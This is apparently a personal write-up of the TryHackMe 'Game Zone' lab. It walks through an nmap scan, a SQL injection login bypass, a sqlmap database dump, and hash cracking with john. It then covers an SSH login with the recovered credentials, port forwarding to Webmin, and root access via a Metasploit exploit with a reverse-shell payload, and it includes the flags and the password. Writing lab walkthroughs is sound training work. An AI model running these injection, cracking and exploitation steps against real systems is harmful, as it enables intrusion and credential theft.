  
- What is the name of the large cartoon avatar holding a sniper on the forum ?
	Answer : Agent 47 

## Obtain access via SQLi
--- 
```
# Nmap 7.92 scan initiated Sat Nov 12 05:21:19 2022 as: nmap -sC -sV -Pn -oN nmap_scan.txt -vv 10.10.160.134
Nmap scan report for 10.10.160.134
Host is up, received user-set (0.043s latency).
Scanned at 2022-11-12 05:21:20 EST for 13s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFJTi0lKi0G+v4eFQU+P+CBodBOruOQC+3C/nXv0JVeR7yDWH6iRsFsevDofWcq05MZBr/CDPCnluhZzM1psx+5bp1Eiv3ecO0PF1QjhAzsPwUcmFSG1zAg+S757M+RFeRs0Jw0WMev8N6aR3uBZQSDPwBHGps+mZZZRcsssckJGQCZ4Qg/6PVFIwNGx9UoftdMFyfNMU/TDZmoatzo/FNEJOhbR38dF/xw9s/HRhugrUsLdNHyBxYShcY3B0Y2eLjnnuUWhYPmLZqgHuHr+eKnb1Ae3MB5lJTfZf3OmWaqcDVI3wpvQK7ACC9S8nxL3vYLyzxlvucEZHM9ILBI7Ov
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKAU0Orx0zOb8C4AtiV+Q1z2yj1DKw5Z2TA2UTS9Ee1AYJcMtM62+f7vGCgoTNN3eFj3lTvktOt+nMYsipuCxdY=
|   256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL6LScmHgHeP2OMerYFiDsNPqgqFbsL+GsyehB76kldy
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 12 05:21:33 2022 -- 1 IP address (1 host up) scanned in 13.23 seconds
```

Apache 2.4.18
OS Ubuntu

- Login with sqli
```
' or 1=1 -- -
```

## SQLMAP
--- 
Use burp to intercept a request to the database and save it to a file.

```bash
sqlmap -r request.txt --dbms=mysql --dump
```

We got the results of the dump in :
	/home/kali/.local/share/sqlmap/output/10.10.160.134/dump/db/

What is the hash ? ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

## John
---
Crack the hash : 
```bash
john -w=/usr/share/wordlists/rockyou.txt --format=raw-sha256 ./hash 
```
We get : videogamer124

Then connect to the server using ssh.

agent47/videogamer124

```
┌──(kali㉿kali)-[~/TryHackMe/Rooms/Game_Zone]
└─$ ssh agent47@10.10.160.134                                
The authenticity of host '10.10.160.134 (10.10.160.134)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.160.134' (ED25519) to the list of known hosts.
agent47@10.10.160.134's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt 
649ac17b1480ac13ef1e4fa579dac95c
```

##  Exposing services with reverse SSH tunnels
---
It is given to us the information that port 10000 is blocked from the outside. So we have to use a reverse ssh to connect.

```bash
ssh -L 10000:localhost:10000 agent47@10.10.160.134
```

On our local attacker machine. Then we open the browser to localhost:10000 and connect with the agent47 logins.

We find a webmin cms.
![[Pasted image 20221112114603.png]]
Version 1.580

## Privilege escalation
--- 
Find exploit :
```bash
searchsploit webmin 1.580  
searchsploit -m unix/remote/21851.rb
```

Now import exploit into metasploit :
```bash
cp 21851.rb /usr/share/metasploit-framework/modules/exploits/cgi/web
```

Load metasploit and set the exploit :
```bash
msfconsole
msf6 > use exploit/cgi/web/21851 
```

we set paylaod cmd/unix/reverse 

I had a problem with ssl

=> set ssl false


After getting a shell : 
```shell
use post/multi/manage/shell_to_meterpreter
```
And then go to meterpreter session and cat 

```shell
meterpreter > cat root.txt 
a4b945830144bdd71908d12d902adeee
```

well done ! 